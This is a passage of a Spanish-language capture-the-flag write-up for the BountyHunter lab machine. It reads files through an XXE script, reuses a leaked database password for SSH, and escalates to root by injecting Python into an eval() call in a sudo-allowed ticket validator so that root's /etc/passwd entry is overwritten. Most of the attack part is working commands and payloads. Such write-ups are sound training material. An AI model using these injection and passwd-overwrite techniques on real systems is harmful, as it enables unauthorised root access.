</span></span></code></pre></div><p>Si utilizamos el <em>script</em> de Bash para leer el archivo <code>db.php</code>, obtenemos una contraseña:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ bash xxe.sh /var/www/html/db.php 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// TODO -&gt; Implement login system with the database. 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$dbserver <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;localhost&#34;</span>;
</span></span><span style=display:flex><span>$dbname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;bounty&#34;</span>;
</span></span><span style=display:flex><span>$dbusername <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>;
</span></span><span style=display:flex><span>$dbpassword <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;m19RoAU0hP41A1sTsq6K&#34;</span>;
</span></span><span style=display:flex><span>$testuser <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Esta contraseña se reutiliza para acceder por SSH como usuario <code>development</code>. Sabemos que existe este usuario porque aparece listado en <code>/etc/passwd</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ bash xxe.sh /etc/passwd | grep sh$
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>development:x:1000:1000:Development:/home/development:/bin/bash 
</span></span></code></pre></div><p>Y ahora podemos conseguir la <em>flag</em> <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ssh development@10.10.11.100
</span></span><span style=display:flex><span>development@10.10.11.100&#39;s password:
</span></span><span style=display:flex><span>development@bountyhunter:~$ cat user.txt 
</span></span><span style=display:flex><span>40b17284532347c9d5a94488e640f2b3
</span></span></code></pre></div><h2 id=escalada-de-privilegios-con-sudo>Escalada de privilegios con <code>sudo</code></h2><p>El usuario <code>development</code> puede ejecutar un <em>script</em> de Python como <code>root</code> con <code>sudo</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>development@bountyhunter:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries for development on bountyhunter:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>User development may run the following commands on bountyhunter:
</span></span><span style=display:flex><span>    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</span></span></code></pre></div><p>Existe un archivo llamado <code>contract.txt</code> en su directorio personal. Este archivo da un poco de contexto y aporta razones para tener <code>sudo</code> habilitado para ejecutar el <em>script</em> de Python:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>development@bountyhunter:~$ ls -a
</span></span><span style=display:flex><span>.   .bash_history  .bashrc  contract.txt  .local    .ssh      .viminfo 
</span></span><span style=display:flex><span>..  .bash_logout   .cache   .lesshst      .profile  user.txt
</span></span><span style=display:flex><span>development@bountyhunter:~$ cat contract.txt
</span></span><span style=display:flex><span>Hey team,
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>I&#39;ll be out of the office this week but please make sure that our
</span></span><span style=display:flex><span>contract with Skytrain Inc gets completed.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>This has been our first job since the &#34;rm -rf&#34; incident and we can&#39;t
</span></span><span style=display:flex><span>mess this up. Whenever one of you gets on please have a look at the
</span></span><span style=display:flex><span>internal tool they sent over. There have been a handful of tickets
</span></span><span style=display:flex><span>submitted that have been failing validation and I need you to figure
</span></span><span style=display:flex><span>out why.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>I set up the permissions for you to test this. Good luck.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>-- John
</span></span></code></pre></div><p>El <em>script</em> de Python es el siguiente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#Skytrain Inc Ticket Validation System 0.1</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Do not distribute this file.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_file</span>(loc):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> loc<span style=color:#f92672>.</span>endswith(<span style=color:#e6db74>&#34;.md&#34;</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> open(loc, <span style=color:#e6db74>&#39;r&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Wrong file type.&#34;</span>)
</span></span><span style=display:flex><span>        exit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>evaluate</span>(ticketFile):
</span></span><span style=display:flex><span>    <span style=color:#75715e>#Evaluates a ticket to check for ireggularities.</span>
</span></span><span style=display:flex><span>    code_line <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, x <span style=color:#f92672>in</span> enumerate(ticketFile<span style=color:#f92672>.</span>readlines()):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;# Skytrain Inc&#34;</span>):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;## Ticket to &#34;</span>):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Destination: </span><span style=color:#e6db74>{</span><span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>.</span>join(x<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#ae81ff>3</span>:])<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>) 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;__Ticket Code:__&#34;</span>):
</span></span><span style=display:flex><span>            code_line <span style=color:#f92672>=</span> i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> code_line <span style=color:#f92672>and</span> i <span style=color:#f92672>==</span> code_line:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;**&#34;</span>):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>            ticketCode <span style=color:#f92672>=</span> x<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;+&#34;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> int(ticketCode) <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>:
</span></span><span style=display:flex><span>                validationNumber <span style=color:#f92672>=</span> eval(x<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>))
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> validationNumber <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    fileName <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Please enter the path to the ticket file.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    ticket <span style=color:#f92672>=</span> load_file(fileName)
</span></span><span style=display:flex><span>    <span style=color:#75715e>#DEBUG print(ticket)</span>
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> evaluate(ticket)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (result):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Valid ticket.&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Invalid ticket.&#34;</span>)
</span></span><span style=display:flex><span>    ticket<span style=color:#f92672>.</span>close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>main()
</span></span></code></pre></div><p>Hay un <em>code smell</em> en este <em>script</em>, que es el uso de la función <code>eval()</code>, la cual es una funcion insegura y no se recomienda utilizar. Con esta función, podemos conseguir ejecución de código arbitrario como <code>root</code> (porque tenemos permisos con <code>sudo</code>) mediante una inyección de comandos en lenguaje Python.</p><p>En esta situación, hay muchas alternativas para ganar acceso como <code>root</code>. Esta vez, modificaremos la contraseña de <code>root</code> en el archivo <code>/etc/passwd</code>. Por ejemplo, podemos utilizar la siguiente contraseña y encriptarla con <code>openssl</code> (formato DES Unix):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ openssl passwd rocky 
</span></span><span style=display:flex><span>JyHhfPjiAYUB2
</span></span></code></pre></div><p>Podemos hacer uso de la función <code>open()</code> de Python para leer archivos y escribir en ellos como <code>root</code>. La idea es meter la contraseña en <code>/etc/passwd</code> para el usuario <code>root</code>, como sigue:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:#f92672>- root:x:0:0:root:/root:/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+ root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash 
</span></span></span></code></pre></div><p>Mirando el código, el programa está leyendo un archivo MarkDown (<em>ticket</em>) y haciendo una serie de validaciones. La primera es:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>for</span> i, x <span style=color:#f92672>in</span> enumerate(ticketFile<span style=color:#f92672>.</span>readlines()): 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;# Skytrain Inc&#34;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span></code></pre></div><p>Entonces, la primera línea del archivo tiene que ser <code># Skytrain Inc</code>. Y aquí hay otra validación:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;## Ticket to &#34;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Destination: </span><span style=color:#e6db74>{</span><span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>.</span>join(x<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#ae81ff>3</span>:])<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>) 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span></code></pre></div><p>El programa espera una segunda línea específica, por lo que el archivo tiene que tener <code>## Ticket to</code> como segunda línea.</p><p>Y después, para poder introducir código de Python, necesitamos otra línea, porque hay otra validación más:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#66d9ef>if</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;__Ticket Code:__&#34;</span>):
</span></span><span style=display:flex><span>        code_line <span style=color:#f92672>=</span> i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> code_line <span style=color:#f92672>and</span> i <span style=color:#f92672>==</span> code_line:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;**&#34;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        ticketCode <span style=color:#f92672>=</span> x<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;+&#34;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> int(ticketCode) <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>:
</span></span><span style=display:flex><span>            validationNumber <span style=color:#f92672>=</span> eval(x<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)) 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> validationNumber <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span></code></pre></div><p>Como se puede ver, otra línea que hay que poner es <code>__Ticket Code:__</code>.</p><p>Y finalmente, la variable <code>ticketCode</code> tiene que ser un número que tenga resto <code>4</code> al ser dividido entre <code>7</code> (por ejemplo: <code>4</code>, <code>11</code>, <code>18</code> o <code>-3</code>). Este <code>ticketCode</code> tiene que continuar con un signo <code>+</code> y después el código que irá directo a la función <code>eval()</code>.</p><p>Ahora tenemos que crear el archivo <code>ticket.md</code> válido para ejecutar el código con la función <code>eval()</code>. Una opción posible es:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-markdown data-lang=markdown><span style=display:flex><span># Skytrain Inc
</span></span><span style=display:flex><span><span style=color:#75715e>## Ticket to 7Rocky
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>__Ticket Code:__
</span></span><span style=display:flex><span><span style=font-weight:700>**4+open(&#39;/etc/passwd&#39;, &#39;w&#39;).write(&#39;root:JyHhfPjiAYUB2&#39; + open(&#39;/tmp/passwd&#39;).read()[6:])**</span> 
</span></span></code></pre></div><p>El código de Python inyectado es:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>open(<span style=color:#e6db74>&#39;/etc/passwd&#39;</span>, <span style=color:#e6db74>&#39;w&#39;</span>)<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#39;root:JyHhfPjiAYUB2&#39;</span> <span style=color:#f92672>+</span> open(<span style=color:#e6db74>&#39;/tmp/passwd&#39;</span>)<span style=color:#f92672>.</span>read()[<span style=color:#ae81ff>6</span>:]) 
</span></span></code></pre></div><p>Para que funcione, tenemos que guardar una copia de <code>/etc/passwd</code> en <code>/tmp/passwd</code>. El uso de <code>[6:]</code> es para obtener todo el contenido de <code>/tmp/passwd</code> a excepción de los 6 primeros caracteres, que corresponden exactamente a <code>root:x</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>development@bountyhunter:~$ cp /etc/passwd /tmp/passwd 
</span></span><span style=display:flex><span>development@bountyhunter:~$ head -1 /tmp/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>development@bountyhunter:~$ head -1 /etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span></code></pre></div><p>Ahora ejecutamos el <em>script</em> y especificamos el archivo <code>ticket.md</code> donde está guardado. Como se puede ver, la contraseña de <code>root</code> ha cambiado:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
</span></span><span style=display:flex><span>Please enter the path to the ticket file.
</span></span><span style=display:flex><span>ticket.md
</span></span><span style=display:flex><span>Destination: 7Rocky
</span></span><span style=display:flex><span>Valid ticket.
</span></span><span style=display:flex><span>development@bountyhunter:~$ head -1 /etc/passwd
</span></span><span style=display:flex><span>root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash
</span></span></code></pre></div><p>Y ahora podemos acceder como <code>root</code> porque tenemos la contraseña:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>development@bountyhunter:~$ su root
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span>root@bountyhunter:/home/development# cat /root/root.txt 
</span></span><span style=display:flex><span>5d5a6aae768dd80352e1cefa556aac3f
</span></span></code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#explotando-un-xxe>Explotando un XXE</a></li><li><a href=#encontrando-una-contraseña-para-conectarnos-a-la-máquina>Encontrando una contraseña para conectarnos a la máquina</a></li><li><a href=#escalada-de-privilegios-con-sudo>Escalada de privilegios con <code>sudo</code></a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>